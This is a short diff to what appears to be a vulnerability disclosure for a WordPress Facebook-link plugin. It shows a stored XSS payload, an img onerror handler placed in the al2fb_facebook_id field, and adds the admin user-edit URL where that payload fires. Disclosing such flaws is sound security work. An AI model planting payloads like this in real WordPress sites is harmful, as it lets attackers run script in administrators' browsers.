@@ -29,6 +29,10 @@ al2fb_facebook_id='"><img src=x onerror=console.log(/xss_att_fackbookid/)><'"
 
 When I use the user "admin" to edit the profile of the user "test", we can view the stored-xss.
 
+```
+http://localhost/wordpress/wp-admin/user-edit.php?user_id=2&wp_http_referer=%2Fwordpress%2Fwp-admin%2Fusers.php
+```
+
 ![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Add-Link-to-Facebook/view-xss.png)
 
 
